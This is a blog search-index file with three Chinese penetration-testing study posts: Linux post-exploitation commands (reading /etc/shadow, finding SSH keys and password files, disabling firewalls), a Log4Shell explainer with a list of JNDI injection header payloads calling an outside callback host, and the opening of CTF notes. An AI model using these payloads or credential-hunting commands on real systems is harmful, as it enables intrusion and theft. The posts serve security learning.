<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>linux系统渗透测试常用命令及基础知识</title>
    <url>/2022/11/08/12-15-43/</url>
    <content><![CDATA[<h1 id="linux系统渗透测试常用命令及基础知识"><a href="#linux系统渗透测试常用命令及基础知识" class="headerlink" title="linux系统渗透测试常用命令及基础知识"></a>linux系统渗透测试常用命令及基础知识</h1><p>在打靶时发现自己对于Linux系统的基本指令及常识缺乏严重以至于当自己在进入靶机后无从下手。现就此简单学习记录一下。</p>
<p>参考文章链接：</p>
<p><a href="https://blog.csdn.net/luansj/article/details/97272672"> Linux常用命令大全（非常全！！！）_木头大左的博客-CSDN博客_linux常用命令</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=Mzg2ODYxMzY3OQ==&mid=2247489896&idx=1&sn=f3b0d372f3ec62b3bbdef15e5a8c33fa&chksm=cea8f228f9df7b3e5057215e521cbad9147fedd1313a01237fa10ea2b2ad03d3cb8273f833f1#rd">详细|Linux内网渗透基础篇 (qq.com)</a></p>
<p>飞书东方隐侠团队文档</p>
<h1 id="基础判断理解"><a href="#基础判断理解" class="headerlink" title="基础判断理解"></a>基础判断理解</h1><p>当我们进入目标机器拿到权限时我们第一时间要判断的就是我们的权限是什么</p>
<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221108125019.png"></p>
<p>如图,我使用我打过的一个靶机举例:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#:管理员</span><br><span class="line">$:普通用户</span><br><span class="line">@:之前表示登录的用户名称，之后表示主机名，再之后表示当前所在目录</span><br><span class="line">/:表示根目录  </span><br><span class="line">~:表示当前用户家目录</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用cd 命令不加参数,默认回到当前用户家目录</span><br><span class="line">使用cd / 命令,可回到/目录下</span><br></pre></td></tr></table></figure>



<p>在上图中我通过ssh远程连接到的主机拿到的权限就是普通用户,目前位于该用户的文件夹目录下.</p>
<h1 id="权限利用的思路"><a href="#权限利用的思路" class="headerlink" title="权限利用的思路"></a>权限利用的思路</h1><p>当我们进入到受害机后应该有一个完整的思路.</p>
<h2 id="按我目前的知识眼界来"><a href="#按我目前的知识眼界来" class="headerlink" title="按我目前的知识眼界来:"></a>按我目前的知识眼界来:</h2><p>一般当我们进入到受害机时拿到的权限都是不同的,所以这时我们的第一思路都是提权,但不同的用户提权都不一样</p>
<h3 id="linux用户区分"><a href="#linux用户区分" class="headerlink" title="linux用户区分:"></a>linux用户区分:</h3><p>id：查看当前用户UID</p>
<ul>
<li><h4 id="管理用户和组账号"><a href="#管理用户和组账号" class="headerlink" title="管理用户和组账号"></a>管理用户和组账号</h4></li>
<li><ul>
<li><p> 用户账号分为       </p>
</li>
<li><p> 超级用户、普通用户、程序用户 </p>
</li>
<li><p>组账号分为     </p>
</li>
<li><p>   基本组(私有组)、附加组(公共组)</p>
</li>
<li><p> UID和GID   </p>
</li>
<li><p> UID(用户标识符)    GID(组标识符)</p>
</li>
<li><ul>
<li>0：系统的管理员用户</li>
<li>1~999：Linux为了避免某个服务程序出现漏洞被攻击者提权至整个服务器，所以默认服务程序会有独立的系统用户负责运行</li>
<li><code>&gt;=</code>1000：管理员创建，用于日常工作的用户</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h4><ul>
<li><p>一个账号只能有一个基本组，但是可以有多个附加组</p>
</li>
<li><p>用户的账号信息存储在/etc/passwd</p>
</li>
<li><p>用户密码信息存储在/etc/shadow</p>
</li>
<li><p>当用户在/etc/shadow中的密码信息前有一个或两个！时表示用户被锁定</p>
</li>
</ul>
<h2 id="权限判断"><a href="#权限判断" class="headerlink" title="权限判断"></a>权限判断</h2><p>当我们进入受害机时首先就是要判断我们拿到的用户能干嘛</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">cat /etc/passwd     列出系统上的所有用户</span><br><span class="line">cat /etc/shadow     查看用户Hash</span><br><span class="line">cat /etc/group      列出系统上的所有组</span><br><span class="line">groups              当前用户所在的组</span><br><span class="line">groups test         test用户所在的组</span><br><span class="line">getent group xxx      xxx组里的用户</span><br><span class="line"></span><br><span class="line">grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &#x27;$3 == 0 &#123; print $1&#125;&#x27;      列出所有的超级用户账户</span><br><span class="line">awk -F: &#x27;length($2)==0 &#123;print $1&#125;&#x27; /etc/shadow  #查看是否存在空口令用户</span><br><span class="line">awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow #查看远程登录的账号 </span><br><span class="line"></span><br><span class="line">whoami              查看当前用户</span><br><span class="line">w                   谁目前已登录，他们正在做什么</span><br><span class="line">who                 命令用于显示系统中有哪些使用者正在上面</span><br><span class="line">last                最后登录用户的列表</span><br><span class="line">lastlog             所有用户上次登录的信息</span><br><span class="line">lastlog –u %username%  有关指定用户上次登录的信息</span><br></pre></td></tr></table></figure>

<p>使用靶机举例:</p>
<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221108132748.png"></p>
<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221108132804.png"></p>
<p>silky用户位于sudo组下,我们可以尝试 sudo su root 命令直接提权到root权限.</p>
<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221108134115.png"></p>
<p>如图所示,我们成功拿到root权限,</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>但我们并不可能像菜鸡靶机一样,随随便便就能拿到一个在adm组,sudo组里的用户,所以在得到我们的用户不属于那种直接就能提权的用户后.我们就需要对受害机进行信息收集.看看有没有可以利用的漏洞缺陷.</p>
<h3 id="信息收集点："><a href="#信息收集点：" class="headerlink" title="信息收集点："></a>信息收集点：</h3><p>参考链接：<a href="https://blog.csdn.net/bring_coco/article/details/114262148"> Linux信息收集_番茄酱料的博客-CSDN博客</a></p>
<h4 id="系统信息收集："><a href="#系统信息收集：" class="headerlink" title="系统信息收集："></a>系统信息收集：</h4><p>命令：</p>
<p>命令：uname -r<br>作用：打印内核版本信息</p>
<p>命令：uname -n<br>作用：系统主机名字</p>
<p>命令：uname -n<br>作用：系统主机名字</p>
<p>命令：uname -m<br>作用：系统架构</p>
<p>命令：uname -a<br>作用：打印所有可用的系统信息，包括查看内核/操作系统/信息等</p>
<p>命令：cat /proc/version<br>作用：查看内核信息</p>
<p>命令：cat /proc/cpuinfo<br>作用：查看CPU详情</p>
<p>命令：cat /etc/*-release 注：这里的是因为不同系统名称不同<br>作用：查看发布信息</p>
<p>命令：df -a<br>作用：文件系统信息</p>
<h4 id="用户和组的信息"><a href="#用户和组的信息" class="headerlink" title="用户和组的信息:"></a>用户和组的信息:</h4><p>上文已经介绍过一部分了,现在更详细一点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd     列出系统上的所有用户</span><br><span class="line">cat /etc/shadow     查看用户Hash(需要root权限)</span><br><span class="line">cat /etc/group      列出系统上的所有组</span><br><span class="line">groups              当前用户所在的组</span><br><span class="line">groups test         test用户所在的组</span><br><span class="line">getent group xxx      xxx组里的用户</span><br><span class="line"></span><br><span class="line">grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &#x27;$3 == 0 &#123; print $1&#125;&#x27;      列出所有的超级用户账户</span><br><span class="line">awk -F: &#x27;length($2)==0 &#123;print $1&#125;&#x27; /etc/shadow  #查看是否存在空口令用户</span><br><span class="line">awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow #查看远程登录的账号 </span><br><span class="line"></span><br><span class="line">whoami              查看当前用户</span><br><span class="line">w                   谁目前已登录，他们正在做什么</span><br><span class="line">who                 命令用于显示系统中有哪些使用者正在上面</span><br><span class="line">last                最后登录用户的列表</span><br><span class="line">lastlog             所有用户上次登录的信息</span><br><span class="line">lastlog –u %username%  有关指定用户上次登录的信息</span><br></pre></td></tr></table></figure>

<h4 id="用户和权限信息"><a href="#用户和权限信息" class="headerlink" title="用户和权限信息:"></a>用户和权限信息:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：whoami</span><br><span class="line">作用：查看当前用户</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：id</span><br><span class="line">作用：查看当前用户信息</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：cat /etc/sudoers</span><br><span class="line">作用：可以使用sudo提升到root用户（需要root权限）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：sudo</span><br><span class="line">作用：允许普通用户执行一些或者全部的root命令的一个工具</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：sudo -l</span><br><span class="line">作用：列出目前用户可执行与无法执行的指令</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：su 用户（指定要切换身份的目标用户）</span><br><span class="line">作用：切换当前用户身份到其他用户身份</span><br></pre></td></tr></table></figure>

<h4 id="系统内环境信息："><a href="#系统内环境信息：" class="headerlink" title="系统内环境信息："></a>系统内环境信息：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v命令：env</span><br><span class="line">作用：打印系统环境信息</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：echo $USER</span><br><span class="line">作用：输出上述环境变量中的信息</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：history</span><br><span class="line">作用：打印历史命令</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：pwd</span><br><span class="line">作用：显示当前路径</span><br></pre></td></tr></table></figure>

<h4 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息:"></a>网络信息:</h4><p>或许是判断主机是否外联或组成域的关键</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：ifconfig</span><br><span class="line">作用：查看所有网络接口的属性</span><br></pre></td></tr></table></figure>

<p>主机防火墙,但我们打的靶机一般是不会有滴</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：iptables -L</span><br><span class="line">作用：查看防火墙设置</span><br><span class="line">查看防火墙状态：</span><br><span class="line">systemctl status firewalld</span><br><span class="line">service iptables status</span><br><span class="line">暂时关闭防火墙:</span><br><span class="line">systemctl stop firewalld</span><br><span class="line">service iptables stop</span><br><span class="line">永久关闭防火墙：</span><br><span class="line">systemctl disable firewalld</span><br><span class="line">chkconfig iptables off</span><br><span class="line">重启防火墙：</span><br><span class="line">systemctl enable firewalld</span><br><span class="line">service iptables restart</span><br></pre></td></tr></table></figure>

<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221109115544.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：route -n</span><br><span class="line">作用：查看路由表</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>下面两个命令最常用了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：netstat -lntp</span><br><span class="line">作用：查看所有监听端口</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：netstat -antp</span><br><span class="line">作用：查看所有已经建立的连接</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：netstat -an</span><br><span class="line">作用：打印本地端口开放信息</span><br></pre></td></tr></table></figure>

<p><strong>端口映射：</strong>端口映射就是将内网中的主机的一个端口映射到外网主机的一个端口，提供相应的服务。当用户访问外网IP的这个端口时，服务器自动将请求映射到对应局域网内部的机器上。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：cat /etc/services</span><br><span class="line">作用：查看端口服务映射</span><br></pre></td></tr></table></figure>

<h4 id="查找有用的信息"><a href="#查找有用的信息" class="headerlink" title="查找有用的信息:"></a>查找有用的信息:</h4><p>查找能写或执行的目录</p>
<p>该命令是根据当前用户的权限所列出的该用户可操作文件目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -writable -type d 2&gt;/dev/null</span><br><span class="line">find / -perm -o+w -type d 2&gt;/dev/null</span><br><span class="line">find / -perm -o+x -type d 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<h4 id="敏感文件查找"><a href="#敏感文件查找" class="headerlink" title="敏感文件查找:"></a>敏感文件查找:</h4><p>find命令 -o参数 表示 <strong>或者</strong> 的意思 (可以按该命令格式改一下我们想查找的文件)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -type f -iname &quot;*.bash_history&quot; -o -iname &quot;*config*&quot; -o -iname &quot;web.xml&quot; -o -iname &quot;*database*&quot; -o -iname &quot;*pass*&quot; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>查找SSH密钥:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -name &quot;id_dsa*&quot; -o -name &quot;id_rsa*&quot; -o -name &quot;known_hosts&quot; -o -name &quot;authorized_hosts&quot; -o -name &quot;authorized_keys&quot; 2&gt;/dev/null |xargs -r ls</span><br></pre></td></tr></table></figure>

<h1 id="web应用服务常见配置文件路径"><a href="#web应用服务常见配置文件路径" class="headerlink" title="web应用服务常见配置文件路径:"></a>web应用服务常见配置文件路径:</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/apache/apache/conf/httpd.conf</span><br><span class="line">/apache/apache2/conf/httpd.conf</span><br><span class="line">/apache/php/php.ini</span><br><span class="line">/bin/php.ini</span><br><span class="line">/etc/apache/apache.conf</span><br><span class="line">/etc/apache/httpd.conf</span><br><span class="line">/etc/apache2/apache.conf</span><br><span class="line">/etc/apache2/httpd.conf</span><br><span class="line">/etc/apache2/sites-available/default</span><br><span class="line">/etc/apache2/vhosts.d/00_default_vhost.conf</span><br><span class="line">/etc/httpd/conf.d/httpd.conf</span><br><span class="line">/etc/httpd/conf.d/php.conf</span><br><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line">/etc/httpd/php.ini</span><br><span class="line">/etc/init.d/httpd</span><br><span class="line">/etc/php.ini</span><br><span class="line">/etc/php/apache/php.ini</span><br><span class="line">/etc/php/apache2/php.ini</span><br><span class="line">/etc/php/cgi/php.ini</span><br><span class="line">/etc/php/php.ini</span><br><span class="line">/etc/php/php4/php.ini</span><br><span class="line">/etc/php4.4/fcgi/php.ini</span><br><span class="line">/etc/php4/apache/php.ini</span><br><span class="line">/etc/php4/apache2/php.ini</span><br><span class="line">/etc/php4/cgi/php.ini</span><br><span class="line">/etc/php5/apache/php.ini</span><br><span class="line">/etc/php5/apache2/php.ini</span><br><span class="line">/etc/php5/cgi/php.ini</span><br><span class="line">/etc/phpmyadmin/config.inc.php</span><br><span class="line">/home/apache/conf/httpd.conf</span><br><span class="line">/home/apache2/conf/httpd.conf</span><br><span class="line">/home/bin/stable/apache/php.ini</span><br><span class="line">/home2/bin/stable/apache/php.ini</span><br><span class="line">/NetServer/bin/stable/apache/php.ini</span><br><span class="line">/opt/www/conf/httpd.conf</span><br><span class="line">/opt/xampp/etc/php.ini</span><br><span class="line">/PHP/php.ini</span><br><span class="line">/php/php.ini</span><br><span class="line">/php4/php.ini</span><br><span class="line">/php5/php.ini</span><br><span class="line">/usr/lib/php.ini</span><br><span class="line">/etc/nginx/nginx.conf</span><br><span class="line">/usr/lib/php/php.ini</span><br><span class="line">/usr/local/apache/conf/httpd.conf</span><br><span class="line">/usr/local/apache/conf/php.ini</span><br><span class="line">/usr/local/apache2/conf/httpd.conf</span><br><span class="line">/usr/local/apache2/conf/php.ini</span><br><span class="line">/usr/local/etc/php.ini</span><br><span class="line">/usr/local/httpd/conf/httpd.conf</span><br><span class="line">/usr/local/lib/php.ini</span><br><span class="line">/usr/local/php/lib/php.ini</span><br><span class="line">/usr/local/php4/lib/php.ini</span><br><span class="line">/usr/local/php4/lib/php.ini</span><br><span class="line">/usr/local/php4/php.ini</span><br><span class="line">/usr/local/php5/etc/php.ini</span><br><span class="line">/usr/local/php5/lib/php.ini</span><br><span class="line">/usr/local/php5/php5.ini</span><br><span class="line">/usr/local/share/examples/php/php.ini</span><br><span class="line">/usr/local/share/examples/php4/php.ini</span><br><span class="line">/usr/local/Zend/etc/php.ini</span><br><span class="line">/var/apache2/config.inc</span><br><span class="line">/var/httpd/conf/httpd.conf</span><br><span class="line">/var/httpd/conf/php.ini</span><br><span class="line">/var/httpd/conf/php.ini</span><br><span class="line">/var/local/www/conf/httpd.conf</span><br><span class="line">/var/local/www/conf/php.ini</span><br><span class="line">/var/www/conf/httpd.conf</span><br><span class="line">/web/conf/php.ini</span><br><span class="line">/www/conf/httpd.conf</span><br><span class="line">/www/php/php.ini</span><br><span class="line">/www/php4/php.ini</span><br><span class="line">/www/php5/php.ini</span><br><span class="line">/xampp/apache/bin/php.ini</span><br><span class="line">/xampp/apache/conf/httpd.conf</span><br></pre></td></tr></table></figure>

<p>数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/init.d/mysql</span><br><span class="line">/etc/my.cnf</span><br><span class="line">/etc/mysql/my.cnf</span><br><span class="line">/etc/mysql/my.cnf</span><br><span class="line">/var/lib/mysql/my.cnf</span><br><span class="line">/var/lib/mysql/mysql/user.MYD</span><br><span class="line">/usr/local/mysql/bin/mysql</span><br><span class="line">/usr/local/mysql/my.cnf</span><br><span class="line">/usr/share/mysql/my.cnf</span><br></pre></td></tr></table></figure>

<p>埋个坑,找找自动化脚本,我记得小迪视频里就有</p>
]]></content>
      <categories>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title>log4j漏洞分析及总结</title>
    <url>/2022/12/11/11-12-28/</url>
    <content><![CDATA[<h1 id="log4j漏洞分析及总结"><a href="#log4j漏洞分析及总结" class="headerlink" title="log4j漏洞分析及总结"></a>log4j漏洞分析及总结</h1><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://mp.weixin.qq.com/s/4MnOQGg7LBYCUE7BuuGfEQ">核弹级漏洞！我把log4j扒给你看！ (qq.com)</a></p>
<p><a href="https://blog.csdn.net/Koikoi12/article/details/121906895"> log4j漏洞成因和原理（JNDI和LDAP）_Koikoi123的博客-CSDN博客_log4j原理</a></p>
<p>（看完文章让我想起了PHPmyadmin里的全局日志文件写入shell这也是通过日志手段的漏洞应用：<a href="https://www.wanheiqiyihu.top/articles/162%EF%BC%89">https://www.wanheiqiyihu.top/articles/162）</a></p>
<h2 id="log4j漏洞产生原因"><a href="#log4j漏洞产生原因" class="headerlink" title="log4j漏洞产生原因"></a>log4j漏洞产生原因</h2><p>原因概括为：在使用java日志输出框架log4j2时其中的JNDI lookup（Java允许通过JNDI远程去下载一个class文件来加载对象）对请求字符的合法性限制不足导致的远程代码执行。</p>
<h1 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h1><p>不管是什么编程语言，不管是前端后端还是客户端，对<strong>打日志</strong>都不会陌生。</p>
<p>通过日志，可以帮助我们了解程序的运行情况，排查程序运行中出现的问题。</p>
<p>在Java技术栈中，用的比较多的日志输出框架主要是<strong>log4j2</strong>和<strong>logback</strong>。</p>
<p>我们经常会在日志中输出一些变量，比如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">logger.info(&quot;client ip: &#123;&#125;&quot;, clientIp)</span><br></pre></td></tr></table></figure>

<p>现在思考一个问题：</p>
<p>假如现在想要通过日志输出一个Java对象，但这个对象不在程序中，而是在其他地方，比如可能在某个文件中，甚至可能在网络上的某个地方，这种时候怎么办呢？</p>
<p>log4j2的强大之处在于，除了可以输出程序中的变量，它还提供了一个叫<strong>Lookup</strong>的东西，可以用来输出更多内容：</p>
<p><img src="/imgs/$%7Bfiilename%7D/640.png"></p>
<p>如图所示，lookups最主要的功能就是查找，在log4j2中允许在输出日志的时候，通过某种方式去查找要输出的内容。</p>
<p>log4j2中已经帮我们把常见的查找途径已经实现了，lookup相当于是一个接口，具体去哪里查找，怎么查找，就要靠我们去调用查找功能的模块了。</p>
<p>log4j2常见的查找途径：</p>
<p><img src="/imgs/$%7Bfiilename%7D/640%20(1).png"></p>
<h2 id="JNDI协议："><a href="#JNDI协议：" class="headerlink" title="JNDI协议："></a>JNDI协议：</h2><p>JNDI即<code>Java Naming and Directory Interface</code>（JAVA命名和目录接口），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。</p>
<p>简单粗暴理解：有一个类似于字典的数据源，你可以通过JNDI接口，传一个name进去，就能获取到对象了。</p>
<p>那不同的数据源肯定有不同的查找方式，所以JNDI也只是一个上层封装，在它下面也支持很多种具体的数据源。</p>
<p><img src="/imgs/$%7Bfiilename%7D/640%20(2).png"></p>
<h2 id="LDAP协议：（用在统一身份认证领域比较多）"><a href="#LDAP协议：（用在统一身份认证领域比较多）" class="headerlink" title="LDAP协议：（用在统一身份认证领域比较多）"></a>LDAP协议：（用在统一身份认证领域比较多）</h2><p>LDAP即<code>Lightweight Directory Access Protocol</code>（轻量级目录访问协议），目录是一个为查询、浏览和搜索而优化的专业分布式数据库，它呈树状结构组织数据，就好象Linux/Unix系统中的文件目录一样。目录数据库和关系数据库不同，它有优异的读性能，但写性能差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。所以目录天生是用来查询的，就好像它的名字一样。</p>
<p><strong>简单粗暴理解</strong>：有一个类似于字典的数据源，你可以通过LDAP协议，传一个name进去，就能获取到数据。</p>
<h2 id="恶意JNDI注入攻击："><a href="#恶意JNDI注入攻击：" class="headerlink" title="恶意JNDI注入攻击："></a>恶意JNDI注入攻击：</h2><p>此攻击是log4j漏洞攻击点之一</p>
<p>网络安全中有一个准则：<strong>不要信任用户输入的任何信息</strong>。（黑客攻击点，未限制的字符输入会导致多种漏洞存在）</p>
<p>假如某一个Java程序中，将浏览器的类型记录到了日志中：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String userAgent = request.getHeader(&quot;User-Agent&quot;);</span><br><span class="line">logger.info(userAgent);</span><br></pre></td></tr></table></figure>

<p>这其中，<code>User-Agent</code>就属于外界输入的信息，而不是自己程序里定义出来的。只要是外界输入的，就有可能存在恶意的内容。</p>
<p>假如有人发来了一个HTTP请求，他的<code>User-Agent</code>是这样一个字符串：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:ldap://127.0.0.1/exploit&#125;</span><br></pre></td></tr></table></figure>



<p>接下来，log4j2将会对这行要输出的字符串进行解析。</p>
<p>首先，它发现了字符串中有 **${}**，知道这个里面包裹的内容是要单独处理的。</p>
<p>进一步解析，发现是JNDI扩展内容。</p>
<p>再进一步解析，发现了是LDAP协议，LDAP服务器在127.0.0.1，要查找的key是exploit。</p>
<p>最后，调用具体负责LDAP的模块去请求对应的数据。</p>
<p>如果只是请求普通的数据，那也没什么，但问题就出在还可以请求Java对象！</p>
<p>Java对象一般只存在于内存中，但也可以通过序列化的方式将其存储到文件中，或者通过网络传输。</p>
<p>如果是自己定义的序列化方式也还好，但更危险的在于：JNDI还支持一个叫命名引用（Naming References）的方式，可以通过远程下载一个class文件，然后下载后加载起来构建对象。</p>
<blockquote>
<p>PS：有时候Java对象比较大，直接通过LDAP这些存储不方便，就整了个类似于二次跳转的意思，不直接返回对象内容，而是告诉你对象在哪个class里，让你去那里找。</p>
</blockquote>
<p>注意，这里就是核心问题了：<strong>JNDI可以远程下载class文件来构建对象！！！</strong>。</p>
<p>危险在哪里？</p>
<p>如果远程下载的URL指向的是一个黑客的服务器，并且下载的class文件里面藏有恶意代码，恶意代码执行后这就是一次恶意的远程代码执行攻击.</p>
<p><img src="/imgs/$%7Bfiilename%7D/640%20(3).png"></p>
<p>这就是鼎鼎大名的JNDI注入攻击！</p>
<p>其实除了LDAP，还有RMI的方式，</p>
<p>**核心在于:**Java允许通过JNDI远程去下载一个class文件来加载对象</p>
<p>JNVDI注入拓展:<a href="https://kingx.me/Exploit-Java-Deserialization-with-RMI.html">深入理解JNDI注入与Java反序列化漏洞利用 – KINGX</a></p>
<h1 id="漏洞验证与复现"><a href="#漏洞验证与复现" class="headerlink" title="漏洞验证与复现:"></a>漏洞验证与复现:</h1><h2 id="log4j-payload"><a href="#log4j-payload" class="headerlink" title="log4j payload:"></a>log4j payload:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Client-IP: $&#123;jndi:ldap://1644763261510dpicz.zdl7qs.ceye.io/VXBQo&#125;</span><br><span class="line">X-Remote-IP: $&#123;jndi:ldap://1644763261510jnabe.zdl7qs.ceye.io/vl&#125;</span><br><span class="line">X-Remote-Addr: $&#123;jndi:ldap://1644763261510xplnj.zdl7qs.ceye.io/hTE&#125;</span><br><span class="line">X-Forwarded-For: $&#123;jndi:ldap://1644763261510lbnhl.zdl7qs.ceye.io/hvgsw&#125;</span><br><span class="line">X-Originating-IP: $&#123;jndi:ldap://1644763261510pbhdy.zdl7qs.ceye.io/LxrC&#125;</span><br><span class="line">True-Client-IP: $&#123;jndi:rmi://1644763261510jjchm.zdl7qs.ceye.io/FrfXm&#125;</span><br><span class="line">Originating-IP: $&#123;jndi:rmi://1644763261510jctho.zdl7qs.ceye.io/vbP&#125;</span><br><span class="line">X-Real-IP: $&#123;jndi:rmi://1644763261510fyvxt.zdl7qs.ceye.io/fWmjt&#125;</span><br><span class="line">Client-IP: $&#123;jndi:rmi://1644763261510nfaoa.zdl7qs.ceye.io/mS&#125;</span><br><span class="line">X-Api-Version: $&#123;jndi:rmi://1644763261510daeem.zdl7qs.ceye.io/IdJ&#125;</span><br><span class="line">Sec-Ch-Ua: $&#123;jndi:dns://1644763261510wjiit.zdl7qs.ceye.io/IX&#125;</span><br><span class="line">Sec-Ch-Ua-Platform: $&#123;jndi:dns://1644763261510dacbb.zdl7qs.ceye.io/ftA&#125;</span><br><span class="line">Sec-Fetch-Site: $&#123;jndi:dns://1644763261510rypwe.zdl7qs.ceye.io/asWuD&#125;</span><br><span class="line">Sec-Fetch-Mode: $&#123;jndi:dns://1644763261510osrig.zdl7qs.ceye.io/zc&#125;</span><br><span class="line">Sec-Fetch-User: $&#123;jndi:dns://1644763261510uvfsl.zdl7qs.ceye.io/oNpOs&#125;</span><br><span class="line">Sec-Fetch-Dest: $&#123;jndi:dns://1644763261510ptqen.zdl7qs.ceye.io/fGwFl&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>以及一些变形的payload:</p>
<p><img src="/imgs/$%7Bfiilename%7D/bf3e6d12124a407484a9a9cc1b87280d.png"></p>
<p>这些payload的形式大多类似与这样：<br><code>$&#123;jndi:ldap://xxxx.com.cn&#125;</code>,</p>
<p>在上文中我们了解到log4j漏洞点主要是JNDI协议下的未限制访问下载class类,所以以这些payload的形式来看更能证述我们上文的解释.</p>
<p>payload构造一个远程访问请求返回攻击者服务器上的恶意class.如果恶意class中的恶意代码成功执行,将使受害机遭到攻击.</p>
<p>log4j2的使用面广泛，除以Java技术为主的公司外，还有一些大量中间件都是用Java开发的，如：kafka、elasticsearch、flink</p>
<p>（或许可以了解一下这些中间件，万一可以捡漏呢）</p>
<p>修复：</p>
<p>新版的log4j2在JNDI lookup中增加了很多限制彻底封锁了通过打印日志去远程加载class的这条路：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.默认不再支持二次跳转（也就是命名引用）的方式获取对象</span><br><span class="line">2.只有在log4j2.allowedLdapClasses列表中指定的class才能获取。</span><br><span class="line">3.只有远程地址是本地地址或者在log4j2.allowedLdapHosts列表中指定的地址才能获取</span><br></pre></td></tr></table></figure>



<h2 id="复现"><a href="#复现" class="headerlink" title="复现:"></a>复现:</h2><p>待定……..</p>
]]></content>
      <categories>
        <category>RCE</category>
      </categories>
      <tags>
        <tag>漏洞库</tag>
      </tags>
  </entry>
  <entry>
    <title>ctf学习笔记</title>
    <url>/2022/10/19/10-48-16/</url>
    <content><![CDATA[<h1 id="新开一章主要用来记载ctf比赛的学习"><a href="#新开一章主要用来记载ctf比赛的学习" class="headerlink" title="新开一章主要用来记载ctf比赛的学习"></a>新开一章主要用来记载ctf比赛的学习</h1><h1 id="在开始前我们得知道什么是ctf"><a href="#在开始前我们得知道什么是ctf" class="headerlink" title="在开始前我们得知道什么是ctf"></a>在开始前我们得知道什么是ctf</h1><p>ctf是属网络信息安全夺旗赛</p>
<h2 id="一般有两种模式"><a href="#一般有两种模式" class="headerlink" title="一般有两种模式"></a>一般有两种模式</h2><h3 id="解题模式"><a href="#解题模式" class="headerlink" title="解题模式"></a>解题模式</h3><p>解题模式一般就是入侵网站或者靶机，攻击成功后系统会显示flag或者在某个目录 文件 数据库寻找 Flag，提交到答题系统得分。</p>
